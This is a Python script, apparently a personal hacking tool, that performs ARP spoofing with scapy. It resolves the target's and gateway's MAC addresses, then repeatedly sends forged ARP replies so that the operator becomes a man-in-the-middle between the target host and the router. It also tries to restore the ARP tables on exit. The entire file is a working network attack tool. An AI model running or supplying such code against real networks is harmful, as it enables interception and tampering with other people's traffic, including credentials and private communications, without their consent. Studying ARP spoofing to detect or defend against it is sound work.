#!/usr/bin/env python3

import argparse
import re
import time
import os
import socket
import signal
import sys
import scapy.all as scapy
from termcolor import colored

# Controlled quite
def def_handler(sig, frame):
    print(colored("\n[!] Quitting the program...\n", "red"))
    revert_spoof()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # CTRL + C

# Menu arguments
def get_arguments():
    argparser = argparse.ArgumentParser(description="ARP Spoofer - MITM")
    argparser.add_argument("-t", "--taret", dest="target", required=True, help="Target IP. (Ex: 192.168.1.2") # target argument
    argparser.add_argument("-r", "--router", dest="router", required=True, help="Gateway IP of router. (Ex: 192.168.1.1)") # router ip argument
    argparser.add_argument("-m", "--mac", dest="mac_address", required=True, help="Your current mac addreess. (Ex: aa:bb:cc:44:55:66)") # mac_address argument
    argparser.add_argument("-i", "--interface", dest="interface", required=True, help="Network Interface Name. (Ex: wlan0)") # interface argument

    args = argparser.parse_args() # get arguments

    return args.target, args.interface, args.router, args.mac_address # return each argument

# Verify correct format of given arguments and root privilege
def verify(target, interface, router_ip, hwsrc):

    # Verify root privilege
    if os.getuid() != 0:
        print(colored("\n[!] Root privilege required.\n", "yellow"))
        sys.exit(1)

    ip_re = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"

    match = True if re.match(ip_re, target) else False # Verify target format
    match_router = True if re.match(ip_re, router_ip) else False # Verify gateway format
    match_mac = True if re.match(r"^([a-fA-F0-9]{0,2}\:){5}[a-fA-F0-9]{0,2}$", hwsrc) else False # Verify mac address format

    interfaces = [i[1] for i in socket.if_nameindex()] # Get all Local Network Interfaces Names
    valid_interface = True if interface in interfaces else False # Verify if the given Network Interface Name is in the PC

    return match and valid_interface and match_router and match_mac # Return True if all is correct

# Get destination mac from target
def get_dst_mac(ip, interface, retries=40):
    for retry in range(retries):
        try:
            arp_packet = scapy.ARP(pdst=ip)
            broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

            arp_packet = broadcast_packet / arp_packet

            answered_list = scapy.srp(arp_packet, iface=interface, timeout=1, verbose=False)[0] # get the anwers

            if answered_list:
                return answered_list[0][1].hwsrc # get and return the hardware source (Mac Address)
        except:
            pass

    else:
        return None
    
# Send spoof message to convert you in a MITM
def spoof(target_ip, interface, router_ip, hwsrc, hwdst):
    arp_packet = scapy.ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=hwsrc, hwdst=hwdst)
    broadcast_packet = scapy.Ether(dst=hwdst)

    packet = broadcast_packet/arp_packet

    scapy.sendp(packet, verbose=False, iface=interface)

def revert_spoof():
    global target_mac, router_mac, interface, target, router_ip

    # Revert for target
    spoof(target, interface, router_ip, target_mac, router_mac)
    
    # Revert for router
    spoof(router_ip, interface, target, router_mac, target_mac)

def print_banner():
    print(colored("""
▄▀█ █▀█ █▀█   █▀ █▀█ █▀█ █▀█ █▀▀ █▀▀ █▀█
█▀█ █▀▄ █▀▀   ▄█ █▀▀ █▄█ █▄█ █▀░ ██▄ █▀▄\n""", 'white'))

    print(colored("""Mᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ\n""", 'yellow'))

# Main logic
def main():
    global target_mac, router_mac, target, interface, router_ip, hwsrc

    print_banner()
    target, interface, router_ip, hwsrc = get_arguments() # get arguments
    isValid = verify(target, interface, router_ip, hwsrc) # Verify format arguments

    if isValid:
        print(colored("\n[+] Getting destination Mac Addresses...\n", "yellow"))
        target_mac =  get_dst_mac(target, interface)
        router_mac =  get_dst_mac(router_ip, interface)
    
        if not target_mac or not router_mac:
            print(colored("\n[!] Error: Failed to get destination mac address.\n", "red"))
            sys.exit(1)
        else:
            print(colored("\n[+] Destination Mac was succesfully obtained.\n", "green"))

        print(colored(f"\n[+] Now you are a Man-In-The-Middle for {target} target.\n", "blue"))
        while True:
            spoof(target, interface, router_ip, hwsrc, target_mac)
            spoof(router_ip, interface, target, hwsrc, router_mac)

            time.sleep(2)
    else:
        print(colored("\n[!] Arguments Incorrect Format.\n", "red"))
        sys.exit(1)

if __name__ == "__main__":
    main()
